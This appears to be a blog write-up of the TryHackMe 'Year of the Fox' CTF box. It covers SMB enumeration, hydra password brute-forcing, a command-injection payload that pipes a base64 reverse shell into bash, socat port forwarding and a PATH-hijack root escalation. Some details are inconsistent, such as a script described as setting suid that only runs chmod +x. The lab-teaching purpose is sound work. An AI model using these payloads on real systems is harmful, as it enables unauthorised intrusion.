---
layout: post
title:  "Year of the Fox Writeup"
date:   2024-06-20 00:00:00 -0400
categories: tryhackme hard
tags: writeup tryhackme hard CTF brute-force command-injection port-forwarding path-abuse
---
## Introduction
This is a hard challenge box on
[TryHackMe](https://tryhackme.com/r/room/anonymousplayground){:target="_blank"}{:rel="noopener noreferrer"}

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
### Port Scan
Let's start with a port scan to see what services are
accessible

```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/yot-fox/scan1.png)

![scan2](/images/yot-fox/scan2.png)

We have three open ports
- 80: HTTP
- 139/445: SMB

### SMB
> Have you tried 
> [enum4linux](https://www.kali.org/tools/enum4linux/){:target="_blank"}{:rel="noopener noreferrer"}
{: .prompt-tip }

`SMB` or the `Server Message Block` protocol is active
so let's see what shares are available and accessible

```bash
smbclient -L \\\\VICTIM_IP
```

![smb list](/images/yot-fox/smb-list.png)

Unfortunately we can't connect to anything. Let's use
[enum4linux](https://www.kali.org/tools/enum4linux/){:target="_blank"}{:rel="noopener noreferrer"}
to extract more information automatically. 

> The `-a` flag can be used to run all checks,
> but the `-r` flag will find the information we need
> faster by only listing the users
{: .prompt-tip }

```bash
enum4linux -r 10.10.210.92
```

![enum4linux users](/images/yot-fox/enum4linux-users.png)

There are two users on system we should take note of
- fox
- rascal


### Web Server
> You will need to brute force credentials with one of
> the users
{: .prompt-tip }

Let's visit the running web server

![http authentication](/images/yot-fox/http-auth.png)

Looks like the page is protected by credentials. We found
two usernames by enumerating `SMB` so let's try to guess
the password with
[hydra](https://github.com/vanhauser-thc/thc-hydra){:target="_blank"}{:rel="noopener noreferrer"}

We have two users but we'll only be able to find a password
for `rascal`

```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f VICTIM_IP http-get
```

![hydra http auth](/images/yot-fox/hydra-http.png)

> The password will change every time the box is run
{: .prompt-info }

Password found! Now we can visit the site

![homepage](/images/yot-fox/homepage.png)

Looks like it's a way to search for something. We need
to figure out what this does so type in anything

![no file](/images/yot-fox/rascal-no-file.png)

Okay interesting it's looking for files. If we just press
the search button with no input it'll give us a list
of the available files

![files](/images/yot-fox/rascal-files.png)

It doesn't give us a way to read any of these files, it
will only return the file name. Now let's figure out a
way to break it

## Initial Foothold
> What characters are forbidden?
{: .prompt-tip }

Let's take a closer look at the request by proxying
a request through 
[Burp Suite](https://portswigger.net/burp){:target="_blank"}{:rel="noopener noreferrer"}

![burp fox](/images/yot-fox/burp-fox.png)

Forwarding this request to the `Repeater` tab will make
it easier to change our input. To figure out more about
how this search is being done, let's send some characters
until we find something that is forbidden

![burp invalid character](/images/yot-fox/burp-invalid.png)

The `$` character is forbidden which is interesting. This
might be a way to prevent 
[command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html){:target="_blank"}{:rel="noopener noreferrer"}
which suggests our input is directly run in a shell

Following this hypothesis and
some trial and error, it's possible to achieve
[command injection](https://owasp.org/www-community/attacks/Command_Injection){:target="_blank"}{:rel="noopener noreferrer"}!
The payload will be placed inside the double quotes and
follows this format

```bash
\"; shell_cmd_here \n
```

The `\";` will escape the string our input is placed in
and the `\n` is the same as prenting enter in a shell
to execute the command. To demonstrate this we can run
the `id` command

```bash
\";id\n
```

![burp command injection](/images/yot-fox/burp-rce.png)

Since we can execute arbitrary shell commands, let's
try to run a
[reverse shell](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}

![burp invalid reverse shell](/images/yot-fox/burp-invalid-revshell.png)

Looks like this payload contains an invalid character.
We could try to find another payload with valid characters
but after some testing, I found that
the pipe character `|` is allowed!

Since we can
[chain commands by piping](https://linuxsimply.com/bash-scripting-tutorial/redirection-and-piping/piping/){:target="_blank"}{:rel="noopener noreferrer"}
we can encode our reverse shell in `base64` then have the
server decode and run our command. Our payload should
look like

```bash
\";echo 'BASE64_REVERSE_SHELL' | base64 --decode | bash \n
```

Setup a listener to catch the reverse shell request and
then send our payload

```bash
nc -lvnp 4444
```

![reverse shell](/images/yot-fox/revshell.png)

We're in! Our shell is a bit unstable and lacks a few
features so we can upgrade it with the following

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# ctrl + z to background the shell
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

After some searching we can find the first web flag
in `/var/www`

![web flag](/images/yot-fox/web-flag.png)

## Horizontal Escalation
> What local ports are listening and how can we
> access it from the outside?
{: .prompt-tip }

Now that we're on the box we can use
[linpeas](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md){:target="_blank"}{:rel="noopener noreferrer"}
or we can check what ports are listening directly with
the command

```bash
ss -tulnp
```

![listening ports](/images/yot-fox/listening-ports.png)

Our initial port scan revealed two exposed services,
`http` and `smb`, but we see that port
22 is also active. This tells us that `ssh` is running
and only accessible locally.

Since we can't access this port from the outside, we
can try 
[port forwarding](https://en.wikipedia.org/wiki/Port_forwarding){:target="_blank"}{:rel="noopener noreferrer"}
to map port 22 to another port.
To achieve this we'll need to upload a
[static socat binary](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64){:target="_blank"}{:rel="noopener noreferrer"}
to the box.
Then we can forward port 22 to port 9999 with the command

```bash
./socat TCP-LISTEN:9999,fork TCP:127.0.0.1:22
```

Let's also enumerate which users can login

```bash
cat /etc/passwd | grep bash
```

![box users](/images/yot-fox/box-users.png)

Now we should be able to access `ssh` on port 9999 from
the outside

```bash
ssh fox@VICTIM_IP -p 9999
```

![ssh port forward](/images/yot-fox/ssh-port-forward.png)

We don't have a password so we'll need to brute force
again...

To cut down on the guess work it'll be the `fox` user this
time

```bash
hydra VICTIM_IP ssh -t 25 -f -P /usr/share/wordlists/rockyou.txt -l fox -s 9999
```

![hydra ssh](/images/yot-fox/hydra-ssh.png)

> The password will change every time the box is run
{: .prompt-info }

Brilliant now we can login and read the flag

![user flag](/images/yot-fox/user-flag.png)

## Root
> What `sudo` permissions does `fox` have?
{: .prompt-tip }

We have access to a new user so let's see what 
`sudo` commands they can run

```bash
sudo -l
```

![fox sudo](/images/yot-fox/fox-sudo.png)

We can run `/usr/sbin/shutdown` as root. There isn't
anything obvious to exploit yet so
[download the binary](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration){:target="_blank"}{:rel="noopener noreferrer"}
then decompile it with
[ghidra](https://github.com/NationalSecurityAgency/ghidra){:target="_blank"}{:rel="noopener noreferrer"}

![shutdown source](/images/yot-fox/ghidra-shutdown.png)

The shutdown binary will call another command `poweroff`.
An absolute path isn't specified which means we
can abuse it! By creating a malicious `poweroff` binary
we can manipulate the `PATH` variable so it is run
before the legitamate`poweroff` binary

In this case let's have our payload
create a new bash binary with the `suid`
bit set. Remember that many things can be done here
to escalate our privileges, so be creative!
Create a file `pe.sh` with the following content

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +x /tmp/bash
```

Make our malicious script executable and rename it to

`poweroff`

```bash
chmod +x pe.sh
mv pe.sh poweroff
```

Now we need to give execution priority to binaries in
our directory. This can be achieved by putting our
current directory at the beginning
of the `PATH` variable

```bash
export PATH=$(pwd):$PATH
```

Everything should be set so let's escalate

```bash
sudo /usr/sbin/shutdown
/tmp/bash -p
```

![root shell](/images/yot-fox/path-abuse.png)

Now we can get the `root` flag

![root shell](/images/yot-fox/root-flag-missing.png)

It's not here... We can use the `find` command to
look for a file with `root` somewhere in the filename

```bash
find / -type f -name "*root*" -ls 2>/dev/null
```

![root flag](/images/yot-fox/root-flag.png)

## Conclusion
By enumerating `smb` we found two usernames which were
used to brute force http authentication on port 80.
This led to a file search service vulnerable
to command injection, giving a foothold onto the system.
`ssh` was running on port 22 but wasn't accessible by
the outside. By forwarding this port and brute forcing
the `ssh` password of the other user, we were able to
horizontally escalate our privilges. This new user had
a single `sudo` entry referring to a `shutdown` binary.
The binary runs another command without an absolute path. 
By creating a malicious copy of this command and
abusing the `PATH` variable, we were able to gain a 
`root` shell.
